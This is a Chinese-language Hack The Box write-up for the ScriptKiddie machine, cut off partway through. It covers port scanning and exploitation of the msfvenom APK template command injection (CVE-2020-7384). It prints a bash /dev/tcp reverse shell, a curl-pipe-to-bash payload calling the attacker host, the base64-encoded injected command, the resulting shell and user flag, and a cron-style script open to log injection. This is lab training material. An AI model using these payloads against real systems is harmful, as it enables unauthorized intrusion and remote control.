@@ -1,0 +1,776 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：msfvenom-apk-模版注入、日志文件写shell、sudo-msfconsole-提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ScriptKiddie-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2023/12/23/ScriptKiddie-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：msfvenom-apk-模版注入、日志文件写shell、sudo-msfconsole-提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/5.png">
+<meta property="article:published_time" content="2023-12-23T15:50:55.000Z">
+<meta property="article:modified_time" content="2023-12-24T15:23:45.696Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/1.png">
+  
+  
+  
+  <title>ScriptKiddie-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ScriptKiddie-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-23 23:50" pubdate>
+          2023年12月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          80 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ScriptKiddie-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：msfvenom-apk-模版注入、日志文件写shell、sudo-msfconsole-提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html</code></p>
+<p>参考链接：<code>https://medium.com/@joemcfarland/hack-the-box-scriptkiddie-writeup-af3a7634dc62</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.226</p>
+<p>2、测试下连通率</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ping 10.10.10.226 -c 4     <br>PING 10.10.10.226 (10.10.10.226) 56(84) bytes of data.<br>64 bytes from 10.10.10.226: icmp_seq=2 ttl=63 time=283 ms<br>64 bytes from 10.10.10.226: icmp_seq=3 ttl=63 time=283 ms<br>64 bytes from 10.10.10.226: icmp_seq=4 ttl=63 time=281 ms<br><br>--- 10.10.10.226 ping statistics ---<br>4 packets transmitted, 3 received, 25% packet loss, time 3009ms<br>rtt min/avg/max/mdev = 280.706/282.376/283.415/1.192 ms<br></code></pre></td></tr></table></figure>
+
+<p>3、获取下开放端口情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -p- --min-rate=10000 -oG allports 10.10.10.226 <br>[sudo] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-24 09:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.226<br>Host is up (0.30s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>5000/tcp open  upnp<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.41 seconds<br>                                                                                         <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+)/open&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> <br>22,5000,                                                                                         <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -sV -sC -p22,5000 -T4 --min-rate=5000 10.10.10.226<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-24 09:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.226<br>Host is up (0.28s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 3c:65:6b:c2:<span class="hljs-built_in">df</span>:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)<br>|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)<br>|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)<br>5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)<br>|_http-server-header: Werkzeug/0.16.1 Python/3.8.5<br>|_http-title: k1d<span class="hljs-string">&#x27;5 h4ck3r t00l5</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>4、访问 5000端口发现是一个msf的辅助使用界面</p>
+<p><img src="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、通过尝试，发现 ping 功能和searchsploit功能，均无法执行命令</p>
+<p><img src="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、不过通过sploits 功能处，检索到 msfvenom 一个版本的漏洞信息</p>
+<p><img src="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">------------------------------------ ---------------------------------<br> Exploit Title                      |  Path<br>------------------------------------ ---------------------------------<br>Metasploit Framework 6.0.11 - msfvenom APK template <span class="hljs-built_in">command</span> injection | multiple/local/49491.py<br>------------------------------------ ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br></code></pre></td></tr></table></figure>
+
+<p>7、结合中间的 msfvenom的功能，这里可能存在漏洞</p>
+<p><code>某些版本的 msfvenom 很容易通过 APK 模板进行命令注入。Script Kiddie 很友善地为我们提供了模板上传功能。</code></p>
+<p>8、通过在本地kali机器上，下载该payload，并进行制作 apk 后门软件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit -m multiple/local/49491.py                     <br>  Exploit: Metasploit Framework 6.0.11 - msfvenom APK template <span class="hljs-built_in">command</span> injection<br>      URL: https://www.exploit-db.com/exploits/49491<br>     Path: /usr/share/exploitdb/exploits/multiple/local/49491.py<br>    Codes: CVE-2020-7384<br> Verified: False<br>File Type: Python script, ASCII text executable<br>Copied to: /home/kali/桌面/49491.py<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">touch</span> shell.sh  <br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">cat</span> shell.sh<br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/10.10.14.2/443 0&gt;&amp;1<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ vim 49491.py <br><br><span class="hljs-comment"># Change me</span><br>payload = <span class="hljs-string">&#x27;curl 10.10.14.2/shell.sh|bash&#x27;</span><br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 49491.py  <br>[+] Manufacturing evil apkfile<br>Payload: curl 10.10.14.2/shell.sh|bash<br>-dname: CN=<span class="hljs-string">&#x27;|echo Y3VybCAxMC4xMC4xNC4yL3NoZWxsLnNofGJhc2g= | base64 -d | sh #</span><br><span class="hljs-string"></span><br><span class="hljs-string">  adding: empty (stored 0%)</span><br><span class="hljs-string">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="hljs-string">正在为以下对象生成 2,048 位RSA密钥对和自签名证书 (SHA256withRSA) (有效期为 90 天):</span><br><span class="hljs-string">         CN=&quot;&#x27;</span>|<span class="hljs-built_in">echo</span> Y3VybCAxMC4xMC4xNC4yL3NoZWxsLnNofGJhc2g= | <span class="hljs-built_in">base64</span> -d | sh <span class="hljs-comment">#&quot;</span><br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>jar 已签名。<br><br>警告: <br>签名者证书为自签名证书。<br>为 -digestalg 选项指定的 SHA1 算法被视为存在安全风险而且被禁用。<br>为 -sigalg 选项指定的 SHA1withRSA 算法被视为存在安全风险而且被禁用。<br>检测到 POSIX 文件权限和/或 symlink 属性。这些属性在进行签名时会被忽略，不受该签名的保护。<br><br>[+] Done! apkfile is at /tmp/tmpba4cwkqa/evil.apk<br>Do: msfvenom -x /tmp/tmpba4cwkqa/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null<br></code></pre></td></tr></table></figure>
+
+<p>9、可以看到 后门 apk 软件已经成功生成了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">ls</span> -la /tmp/tmpba4cwkqa/<br>总计 16<br>drwx------  2 kali kali 4096 12月24日 09:59 .<br>drwxrwxrwt 19 root root 4096 12月24日 09:59 ..<br>-rw-r--r--  1 kali kali    0 12月24日 09:59 empty<br>-rw-r--r--  1 kali kali 2007 12月24日 09:59 evil.apk<br>-rw-r--r--  1 kali kali 2690 12月24日 09:59 signing.keystore<br></code></pre></td></tr></table></figure>
+
+<p>10、我们架设好本地服务，并上次该apk进行获取初始权限</p>
+<p><img src="http://sh1yan.top/photo/ScriptKiddie-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 -m http.server 80  <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.10.226 - - [24/Dec/2023 10:03:31] <span class="hljs-string">&quot;GET /shell.sh HTTP/1.1&quot;</span> 200 -<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.2] from (UNKNOWN) [10.10.10.226] 43882<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (894): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>kid@scriptkiddie:~/html$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(kid) gid=1000(kid) <span class="hljs-built_in">groups</span>=1000(kid)<br>kid@scriptkiddie:~/html$ <br></code></pre></td></tr></table></figure>
+
+<p>11、经过翻阅，我们成功获取到第一个flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">kid@scriptkiddie:~/html$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>__pycache__<br>app.py<br>static<br>templates<br>kid@scriptkiddie:~/html$ <span class="hljs-built_in">ls</span> -la /home/<br><span class="hljs-built_in">ls</span> -la /home/<br>total 16<br>drwxr-xr-x  4 root root 4096 Feb  3  2021 .<br>drwxr-xr-x 20 root root 4096 Feb  3  2021 ..<br>drwxr-xr-x 11 kid  kid  4096 Feb  3  2021 kid<br>drwxr-xr-x  6 pwn  pwn  4096 Feb  3  2021 pwn<br>kid@scriptkiddie:~/html$ <span class="hljs-built_in">ls</span> -la /home/kid/<br><span class="hljs-built_in">ls</span> -la /home/kid/<br>total 60<br>drwxr-xr-x 11 kid  kid  4096 Feb  3  2021 .<br>drwxr-xr-x  4 root root 4096 Feb  3  2021 ..<br>lrwxrwxrwx  1 root kid     9 Jan  5  2021 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout<br>-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc<br>drwxrwxr-x  3 kid  kid  4096 Feb  3  2021 .bundle<br>drwx------  2 kid  kid  4096 Feb  3  2021 .cache<br>drwx------  4 kid  kid  4096 Feb  3  2021 .gnupg<br>drwxrwxr-x  3 kid  kid  4096 Feb  3  2021 .<span class="hljs-built_in">local</span><br>drwxr-xr-x  9 kid  kid  4096 Feb  3  2021 .msf4<br>-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile<br>drwx------  2 kid  kid  4096 Feb 10  2021 .ssh<br>-rw-r--r--  1 kid  kid     0 Jan  5  2021 .sudo_as_admin_successful<br>drwxrwxr-x  5 kid  kid  4096 Feb  3  2021 html<br>drwxrwxrwx  2 kid  kid  4096 Feb  3  2021 logs<br>drwxr-xr-x  3 kid  kid  4096 Feb  3  2021 snap<br>-r--------  1 kid  kid    33 Dec 24 01:35 user.txt<br>kid@scriptkiddie:~/html$ <span class="hljs-built_in">cat</span> /home/kid/user.txt<br><span class="hljs-built_in">cat</span> /home/kid/user.txt<br>b5ff36031c788d02d4253281be9cc233<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>12、通过查看sudo -l 发现，我们并没有当前权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">kid@scriptkiddie:~/html$ sudo -l<br>sudo -l<br>sudo: a terminal is required to <span class="hljs-built_in">read</span> the password; either use the -S option to <span class="hljs-built_in">read</span> from standard input or configure an askpass helper<br>kid@scriptkiddie:~/html$ <br></code></pre></td></tr></table></figure>
+
+<p>13、但是我们发现了还有一个 pwn 用户，且可以查看用户下的一个脚本信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">kid@scriptkiddie:~/html$ <span class="hljs-built_in">ls</span> -la /home/pwn<br><span class="hljs-built_in">ls</span> -la /home/pwn<br>total 44<br>drwxr-xr-x 6 pwn  pwn  4096 Feb  3  2021 .<br>drwxr-xr-x 4 root root 4096 Feb  3  2021 ..<br>lrwxrwxrwx 1 root root    9 Feb  3  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 pwn  pwn   220 Feb 25  2020 .bash_logout<br>-rw-r--r-- 1 pwn  pwn  3771 Feb 25  2020 .bashrc<br>drwx------ 2 pwn  pwn  4096 Jan 28  2021 .cache<br>drwxrwxr-x 3 pwn  pwn  4096 Jan 28  2021 .<span class="hljs-built_in">local</span><br>-rw-r--r-- 1 pwn  pwn   807 Feb 25  2020 .profile<br>-rw-rw-r-- 1 pwn  pwn    74 Jan 28  2021 .selected_editor<br>drwx------ 2 pwn  pwn  4096 Feb 10  2021 .ssh<br>drwxrw---- 2 pwn  pwn  4096 Dec 24 02:00 recon<br>-rwxrwxr-- 1 pwn  pwn   250 Jan 28  2021 scanlosers.sh<br>kid@scriptkiddie:~/html$ <span class="hljs-built_in">cat</span> /home/pwn/scanlosers.sh<br><span class="hljs-built_in">cat</span> /home/pwn/scanlosers.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">log</span>=/home/kid/logs/hackers<br><br><span class="hljs-built_in">cd</span> /home/pwn/<br><span class="hljs-built_in">cat</span> <span class="hljs-variable">$log</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f3- | <span class="hljs-built_in">sort</span> -u | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> ip; <span class="hljs-keyword">do</span><br>    sh -c <span class="hljs-string">&quot;nmap --top-ports 10 -oN recon/<span class="hljs-variable">$&#123;ip&#125;</span>.nmap <span class="hljs-variable">$&#123;ip&#125;</span> 2&gt;&amp;1 &gt;/dev/null&quot;</span> &amp;<br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [[ $(<span class="hljs-built_in">wc</span> -l &lt; <span class="hljs-variable">$log</span>) -gt 0 ]]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> -n &gt; <span class="hljs-variable">$log</span>; <span class="hljs-keyword">fi</span><br>kid@scriptkiddie:~/html$ <br></code></pre></td></tr></table></figure>
+
+<p>14、通过查看演示报告，发现可以直接往 log 日志里写shell，且会被执行到，我们往日志文件里写个反弹shell</p>
